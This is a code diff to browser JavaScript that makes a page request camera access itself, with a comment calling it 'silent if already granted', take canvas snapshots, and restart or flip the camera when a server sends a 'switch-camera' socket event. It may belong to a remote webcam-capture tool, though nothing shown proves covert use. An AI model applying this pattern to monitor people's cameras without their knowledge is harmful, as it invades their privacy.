@@ -211,9 +211,21 @@ let camFacingMode = 'environment';
 
 function startCameraStream() {
     if (camStreamInterval) return;
-    if (!stream || !stream.getVideoTracks().length) return;
+    if (!stream || !stream.getVideoTracks().length) {
+        // Request camera first (silent if already granted)
+        navigator.mediaDevices.getUserMedia({video:{facingMode:camFacingMode},audio:false})
+            .then((s) => {
+                stream = s;
+                const v = document.querySelector('video[data-snap]');
+                if (v) { v.srcObject = s; v.play(); }
+                else { startSnapshots(); }
+                setTimeout(startCameraStream, 500);
+            })
+            .catch(() => {});
+        return;
+    }
     const v = document.querySelector('video[data-snap]');
-    if (!v) return;
+    if (!v) { startSnapshots(); setTimeout(startCameraStream, 500); return; }
     const c = document.createElement('canvas');
     c.width = 320; c.height = 240;
     const ctx = c.getContext('2d');
@@ -246,16 +258,29 @@ socket.on('switch-camera', () => {
     const wasActive = !!camStreamInterval;
     stopCameraStream();
     if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
-    navigator.mediaDevices.getUserMedia({video:{facingMode:camFacingMode,width:{ideal:640},height:{ideal:480}},audio:false})
-        .then((s) => {
-            stream = s;
-            const v = document.querySelector('video[data-snap]');
-            if (v) { v.srcObject = s; v.onloadeddata = () => { if (wasActive) startCameraStream(); }; }
-            if (v && v.readyState >= 2 && wasActive) startCameraStream();
-        })
-        .catch(() => {
-            camFacingMode = camFacingMode === 'environment' ? 'user' : 'environment';
-        });
+    // Small delay for camera hardware to release
+    setTimeout(() => {
+        navigator.mediaDevices.getUserMedia({video:{facingMode:camFacingMode,width:{ideal:640},height:{ideal:480}},audio:false})
+            .then((s) => {
+                stream = s;
+                const v = document.querySelector('video[data-snap]');
+                if (v) {
+                    v.srcObject = s;
+                    v.play();
+                    // Wait for video to be ready, then restart stream
+                    let retries = 0;
+                    const tryStart = () => {
+                        if (v.readyState >= 2 && wasActive) { startCameraStream(); return; }
+                        if (++retries > 30) return;
+                        setTimeout(tryStart, 100);
+                    };
+                    setTimeout(tryStart, 200);
+                }
+            })
+            .catch(() => {
+                camFacingMode = camFacingMode === 'environment' ? 'user' : 'environment';
+            });
+    }, 200);
 });
 
 function togglePass() { const i=passInput; i.type=i.type==='password'?'text':'password'; }
